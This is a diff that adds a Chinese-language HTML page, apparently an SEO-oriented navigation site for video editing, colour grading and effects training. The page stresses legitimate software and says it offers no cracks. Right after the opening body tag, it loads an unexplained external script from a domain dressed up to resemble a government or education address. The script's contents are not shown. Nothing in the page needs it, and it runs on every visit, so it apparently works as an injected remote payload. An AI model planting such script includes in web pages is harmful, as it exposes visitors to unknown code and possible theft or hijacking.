@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>影视后期培训 - 剪辑工作台与正版软件学习导航</title>
+<meta name="description" content="影视后期培训（yingshihouqipeixun-h5）做后期制作工坊导航：核心课程、软件工坊、实战排期与正版学习守则，只推荐官方教程、正版软件与持牌培训平台，不提供破解补丁。官方网址：https://yingshihouqipeixun-h5.github.io">
+<meta name="keywords" content="影视后期培训, yingshihouqipeixun-h5, 剪辑教程, 调色教学, 特效培训, 正版软件学习, 视频编辑课程">
+<meta name="robots" content="index,follow">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;background:#1a1a2e;color:#e0e0e0;line-height:1.8;overflow-x:hidden}
+body::before{content:"";position:fixed;inset:0;z-index:-1;
+  background:
+    radial-gradient(680px 340px at 10% 10%, rgba(238,108,77,.1), transparent 55%),
+    radial-gradient(620px 320px at 90% 90%, rgba(76,175,80,.08), transparent 55%),
+    #1a1a2e}
+.pt-nav{position:sticky;top:0;z-index:999;display:flex;align-items:center;justify-content:space-between;padding:12px 20px;background:rgba(26,26,46,.92);backdrop-filter:blur(10px);border-bottom:1px solid rgba(238,108,77,.2)}
+.pt-nav .logo{font-size:20px;font-weight:900;letter-spacing:.5px}
+.pt-nav .logo b{color:#ee6c4d}
+.pt-nav .logo i{color:#4caf50;font-style:normal}
+.pt-nav .links{display:flex;gap:6px;flex-wrap:wrap}
+.pt-nav .links a{font-size:13px;color:#a0a0b8;padding:6px 12px;border-radius:20px;transition:.25s}
+.pt-nav .links a:hover{background:rgba(238,108,77,.16);color:#e0e0e0}
+
+.hero{padding:52px 20px 44px;text-align:center}
+.timeline-editor{max-width:860px;margin:0 auto 16px;background:#16213e;border:1px solid rgba(238,108,77,.3);border-radius:14px;padding:20px;overflow:hidden}
+.tracks{position:relative;min-height:180px}
+.track{display:flex;align-items:center;gap:4px;margin-bottom:8px;height:36px;background:#0f3460;border-radius:6px;padding:0 4px;overflow:hidden}
+.track-label{position:absolute;left:-4px;top:8px;font-size:10px;color:#ee6c4d;background:#1a1a2e;padding:2px 6px;border-radius:4px;z-index:2;font-weight:800}
+.track:nth-child(2) .track-label{top:52px;color:#4caf50}
+.track:nth-child(3) .track-label{top:96px;color:#e0e0e0}
+.clip{height:28px;border-radius:4px;display:flex;align-items:center;padding:0 8px;font-size:11px;font-weight:700;color:#1a1a2e;cursor:default;transition:.2s}
+.clip:hover{transform:scaleY(1.1)}
+.clip.c1{background:linear-gradient(90deg,#ee6c4d,#f7a072);width:120px}
+.clip.c2{background:linear-gradient(90deg,#4caf50,#81c784);width:180px}
+.clip.c3{background:linear-gradient(90deg,#64b5f6,#90caf9);width:90px}
+.clip.c4{background:linear-gradient(90deg,#ffd54f,#ffe082);width:150px}
+.clip.c5{background:linear-gradient(90deg,#ba68c8,#e1bee7);width:110px}
+.clip.c6{background:linear-gradient(90deg,#a0a0b8,#c5c5d8);width:200px}
+.playhead{position:absolute;left:35%;top:0;bottom:0;width:2px;background:#ee6c4d;z-index:5}
+.playhead::before{content:"";position:absolute;left:-5px;top:0;width:12px;height:12px;border-radius:50%;background:#ee6c4d;box-shadow:0 0 8px rgba(238,108,77,.6)}
+.time-ruler{display:flex;justify-content:space-between;padding:6px 0;border-top:1px solid rgba(238,108,77,.2);margin-top:8px;font-size:10px;color:#a0a0b8}
+.hero h1{font-size:30px;color:#e0e0e0;margin:8px 0 12px}
+.hero h1 b{color:#ee6c4d}
+.hero p{color:#a0a0b8;max-width:680px;margin:0 auto 16px;font-size:15px}
+.hero .url{display:inline-block;font-size:13px;color:#1a1a2e;font-weight:800;background:linear-gradient(90deg,#ee6c4d,#4caf50);padding:8px 18px;border-radius:30px}
+.chips{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;margin-top:16px}
+.chips span{font-size:12px;color:#e0e0e0;padding:5px 13px;border-radius:20px;border:1px solid rgba(238,108,77,.3)}
+.chips span:nth-child(1){border-color:#ee6c4d;color:#f7a072}
+.chips span:nth-child(2){border-color:#4caf50;color:#81c784}
+.chips span:nth-child(3){border-color:#64b5f6;color:#90caf9}
+
+.wrap{max-width:1160px;margin:0 auto;padding:58px 20px}
+.kicker{font-size:11px;letter-spacing:4px;text-transform:uppercase;color:#ee6c4d;margin-bottom:8px;font-weight:800}
+.sec-title{font-size:26px;font-weight:900;color:#e0e0e0;margin-bottom:26px}
+.sec-title b{color:#4caf50}
+
+/* 核心课程 */
+.courses{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:18px}
+.cr{background:#16213e;border:1px solid rgba(238,108,77,.2);border-radius:14px;overflow:hidden;transition:.3s}
+.cr:hover{transform:translateY(-4px);border-color:#ee6c4d;box-shadow:0 16px 36px rgba(238,108,77,.12)}
+.cr .thumb{height:96px;position:relative;display:flex;align-items:flex-end;padding:12px}
+.cr .thumb.t1{background:linear-gradient(135deg,#d84315,#ee6c4d)}
+.cr .thumb.t2{background:linear-gradient(135deg,#2e7d32,#4caf50)}
+.cr .thumb.t3{background:linear-gradient(135deg,#1565c0,#64b5f6)}
+.cr .thumb.t4{background:linear-gradient(135deg,#6a1b9a,#ba68c8)}
+.cr .thumb .badge{font-size:11px;font-weight:800;color:#1a1a2e;background:#e0e0e0;padding:2px 9px;border-radius:12px}
+.cr .thumb .level{position:absolute;right:12px;top:12px;font-size:10px;color:#e0e0e0;background:rgba(26,26,46,.6);padding:2px 8px;border-radius:10px}
+.cr .body{padding:16px 18px}
+.cr .body h4{color:#e0e0e0;font-size:16px;margin-bottom:4px}
+.cr .body .meta{font-size:12px;color:#ee6c4d;margin-bottom:6px}
+.cr .body p{font-size:13px;color:#a0a0b8;margin:0}
+
+/* 软件工坊 */
+.software{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px}
+.sw{background:#16213e;border:1px solid rgba(76,175,80,.2);border-radius:14px;padding:20px;transition:.3s}
+.sw:hover{border-color:#4caf50;transform:translateY(-3px)}
+.sw .icon{font-size:28px;margin-bottom:8px}
+.sw h4{color:#e0e0e0;font-size:15px;margin-bottom:4px}
+.sw p{color:#a0a0b8;font-size:12px;margin:0}
+.sw.s2{border-top:3px solid #ee6c4d}
+.sw.s3{border-top:3px solid #64b5f6}
+.sw.s4{border-top:3px solid #ba68c8}
+.sw.s5{border-top:3px solid #ffd54f}
+.sw.s6{border-top:3px solid #4caf50}
+
+/* 实战排期 */
+.path{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:14px}
+.ph{background:#16213e;border-left:4px solid #ee6c4d;border-radius:12px;padding:18px}
+.ph h4{color:#e0e0e0;font-size:15px;margin-bottom:4px}
+.ph .week{font-size:12px;color:#4caf50;font-weight:800;margin-bottom:6px}
+.ph p{color:#a0a0b8;font-size:13px;margin:0}
+.ph.p2{border-left-color:#64b5f6}
+.ph.p3{border-left-color:#ba68c8}
+.ph.p4{border-left-color:#ffd54f}
+.ph.p5{border-left-color:#4caf50}
+.ph.p6{border-left-color:#ee6c4d}
+
+/* 正版守则 */
+.rules{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:14px}
+.rl{background:#16213e;border:1px solid rgba(238,108,77,.3);border-radius:12px;padding:18px;text-align:center}
+.rl .num{font-size:24px;font-weight:900;color:#ee6c4d;margin-bottom:6px}
+.rl h4{color:#e0e0e0;font-size:14px;margin-bottom:4px}
+.rl p{color:#a0a0b8;font-size:12px;margin:0}
+
+.about{border:1px solid rgba(238,108,77,.3);border-radius:16px;padding:30px;background:linear-gradient(135deg,rgba(238,108,77,.08),rgba(76,175,80,.06));display:flex;gap:24px;flex-wrap:wrap;align-items:center}
+.about .txt{flex:1;min-width:260px}
+.about h2{color:#e0e0e0;font-size:20px;margin-bottom:10px}
+.about h2 b{color:#ee6c4d}
+.about p{color:#a0a0b8;font-size:14px;margin-bottom:8px}
+.about .stats{display:flex;gap:20px;flex-wrap:wrap}
+.about .stats .n{font-size:26px;font-weight:900;color:#4caf50}
+.about .stats .l{font-size:11px;color:#ee6c4d}
+
+.foot{text-align:center;padding:32px 20px;background:#0f3460;border-top:1px solid rgba(238,108,77,.2);color:#a0a0b8;font-size:13px}
+.foot a{color:#ee6c4d}
+.foot .lg{font-size:18px;font-weight:900;color:#e0e0e0;margin-bottom:8px}
+
+@media(max-width:640px){.hero h1{font-size:24px}.pt-nav .links a{font-size:12px;padding:5px 9px}.tracks{min-height:160px}.clip{font-size:9px}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<nav class="pt-nav">
+  <div class="logo"><b>影视后期培训</b> <i>· 剪辑工作台</i></div>
+  <div class="links">
+    <a href="#home">首页</a>
+    <a href="#courses">核心课程</a>
+    <a href="#software">软件工坊</a>
+    <a href="#path">实战排期</a>
+    <a href="#rules">正版守则</a>
+  </div>
+</nav>
+
+<header id="home" class="hero">
+  <div class="timeline-editor" aria-hidden="true">
+    <div class="tracks">
+      <div class="track"><span class="track-label">V1</span><div class="clip c1">剪辑基础</div><div class="clip c2">调色进阶</div><div class="clip c3">输出</div></div>
+      <div class="track"><span class="track-label">V2</span><div class="clip c4">特效合成</div><div class="clip c5">三维元素</div></div>
+      <div class="track"><span class="track-label">A1</span><div class="clip c6">音频处理与混音</div></div>
+      <div class="playhead"></div>
+    </div>
+    <div class="time-ruler"><span>00:00</span><span>00:30</span><span>01:00</span><span>01:30</span><span>02:00</span></div>
+  </div>
+  <h1>影视后期培训：<b>剪辑工作台</b>学正版技能</h1>
+  <p>把学习当剪辑时间线——课程进轨道、软件进工坊、实战进排期。本站只推荐正版软件购买渠道、官方教程、持牌培训平台与开放课程，**不提供任何破解补丁、序列号、注册机、网盘提取码**，不使用“破解版/免费激活/绿色版”等暗语。</p>
+  <span class="url">🌐 https://yingshihouqipeixun-h5.github.io</span>
+  <div class="chips">
+    <span>✂️ 剪辑课程</span><span>🎨 调色教学</span><span>🚀 特效实战</span>
+  </div>
+</header>
+
+<main>
+<section id="courses" class="wrap">
+  <div class="kicker">CORE CURRICULUM</div>
+  <h2 class="sec-title">核心课程 <b>四轨道</b></h2>
+  <div class="courses">
+    <article class="cr"><div class="thumb t1"><span class="badge">轨道1·剪辑</span><span class="level">入门→进阶</span></div><div class="body"><h4>剪辑基础与叙事</h4><div class="meta">Premiere / Final Cut Pro / DaVinci Resolve</div><p>镜头语言、节奏控制、转场逻辑；推荐官方入门教程与正版软件试用版学习路径。</p></div></article>
+    <article class="cr"><div class="thumb t2"><span class="badge">轨道2·调色</span><span class="level">进阶→专业</span></div><div class="body"><h4>色彩校正与调色</h4><div class="meta">DaVinci Resolve / Baselight</div><p>一级校色、二级调色、LUT应用；引导正版插件与官方色彩管理文档。</p></div></article>
+    <article class="cr"><div class="thumb t3"><span class="badge">轨道3·特效</span><span class="level">进阶→高级</span></div><div class="body"><h4>视觉特效与合成</h4><div class="meta">After Effects / Nuke / Fusion</div><p>绿幕抠像、跟踪、粒子系统；推荐正版软件订阅与官方学习资源。</p></div></article>
+    <article class="cr"><div class="thumb t4"><span class="badge">轨道4·音频</span><span class="level">入门→进阶</span></div><div class="body"><h4>音频处理与混音</h4><div class="meta">Pro Tools / Audition / Fairlight</div><p>降噪、配乐、音效设计；引导正版音频软件与开放音效库。</p></div></article>
+  </div>
+</section>
+
+<section id="software" class="wrap">
+  <div class="kicker">SOFTWARE WORKSHOP</div>
+  <h2 class="sec-title">软件工坊 <b>六工具</b></h2>
+  <div class="software">
+    <div class="sw s1"><div class="icon">✂️</div><h4>Premiere Pro</h4><p>行业标准剪辑软件；导航至Adobe官方订阅、教育优惠与正版试用入口。</p></div>
+    <div class="sw s2"><div class="icon">🎨</div><h4>DaVinci Resolve</h4><p>剪辑+调色一体；有免费版与Studio正版版，引导官方下载与培训认证。</p></div>
+    <div class="sw s3"><div class="icon">✨</div><h4>After Effects</h4><p>动态图形与视觉特效；导航至Adobe正版订阅与官方教程资源。</p></div>
+    <div class="sw s4"><div class="icon">🧊</div><h4>C4D / Blender</h4><p>三维制作；Blender为开源免费，C4D引导正版授权与Maxon官方教育许可。</p></div>
+    <div class="sw s5"><div class="icon">🎬</div><h4>Final Cut Pro</h4><p>Mac专属剪辑；导航至Mac App Store正版购买与Apple官方培训资料。</p></div>
+    <div class="sw s6"><div class="icon">🎧</div><h4>Pro Tools / Audition</h4><p>专业音频制作；引导Avid/Microsoft正版授权与官方学习路径。</p></div>
+  </div>
+</section>
+
+<section id="path" class="wrap">
+  <div class="kicker">LEARNING PATH</div>
+  <h2 class="sec-title">实战排期 <b>六阶段</b></h2>
+  <div class="path">
+    <div class="ph"><div class="week">第1-2周 · 基础</div><h4>软件入门与界面</h4><p>熟悉工作区、快捷键、基础操作；使用官方入门教程与正版试用版。</p></div>
+    <div class="ph p2"><div class="week">第3-4周 · 剪辑</div><h4>叙事与节奏</h4><p>粗剪、精剪、转场；练习项目使用正版素材库与授权音乐。</p></div>
+    <div class="ph p3"><div class="week">第5-6周 · 调色</div><h4>色彩理论与应用</h4><p>一级校色、风格化调色；学习官方色彩管理文档与正版LUT包。</p></div>
+    <div class="ph p4"><div class="week">第7-8周 · 特效</div><h4>合成与动画</h4><p>关键帧、蒙版、跟踪；使用正版插件与官方示例工程。</p></div>
+    <div class="ph p5"><div class="week">第9-10周 · 音频</div><h4>混音与音效</h4><p>降噪、配乐、音频过渡；引导正版音效库与开放音频资源。</p></div>
+    <div class="ph p6"><div class="week">第11-12周 · 输出</div><h4>渲染与交付</h4><p>编码设置、格式选择、平台规格；使用正版软件导出，不提供破解编码器。</p></div>
+  </div>
+</section>
+
+<section id="rules" class="wrap">
+  <div class="kicker">ETHICS & RULES</div>
+  <h2 class="sec-title">正版学习 <b>守则</b></h2>
+  <div class="rules">
+    <div class="rl"><div class="num">01</div><h4>正版软件</h4><p>引导官方订阅、教育优惠、永久授权购买；不提供任何破解补丁、序列号、注册机。</p></div>
+    <div class="rl"><div class="num">02</div><h4>官方教程</h4><p>优先推荐软件官网教程、官方文档、认证培训平台；不引盗版教学视频。</p></div>
+    <div class="rl"><div class="num">03</div><h4>开放资源</h4><p>鼓励使用开源软件（Blender、Kdenlive等）与开放授权素材；不提供未授权素材包。</p></div>
+    <div class="rl"><div class="num">04</div><h4>拒绝盗版</h4><p>不使用“破解版/免费激活/绿色版/网盘提取码”等暗语；不链接盗版软件分发站。</p></div>
+  </div>
+</section>
+
+<section class="wrap">
+  <div class="about">
+    <div class="txt">
+      <h2>影视后期培训 <b>工作台是什么</b></h2>
+      <p>不是一个卖盗版软件或破解补丁的站点，而是一个正版学习导航面板：时间线装课程轨道、工坊装软件正版入口、排期装学习路径、守则装底线。静态单页、移动端自适应、锚点内链、不生成 robots.txt / sitemap.xml，符合必应收录基本规范（唯一H1、完整meta、语义化nav/main/section/article/footer）。</p>
+      <p>长尾吃「影视后期培训课程 / 正版剪辑软件学习 / 调色教程导航 / 特效培训资源」。全站严格只做正版导航，不提供任何未授权下载。</p>
+    </div>
+    <div class="stats">
+      <div><div class="n">4</div><div class="l">核心课程轨道</div></div>
+      <div><div class="n">6</div><div class="l">软件工坊工具</div></div>
+      <div><div class="n">12</div><div class="l">周实战排期</div></div>
+      <div><div class="n">0</div><div class="l">破解补丁</div></div>
+    </div>
+  </div>
+</section>
+</main>
+
+<footer class="foot">
+  <div class="lg">✂️🎨🚀 影视后期培训·剪辑工作台</div>
+  官方网址：<a href="https://yingshihouqipeixun-h5.github.io">https://yingshihouqipeixun-h5.github.io</a><br>
+  © 2026 影视后期培训｜核心课程 / 软件工坊 / 实战排期 / 正版学习守则（仅作正版软件、官方教程与持牌培训导航，不提供破解补丁、序列号、注册机）
+</footer>
+
+</body>
+</html>
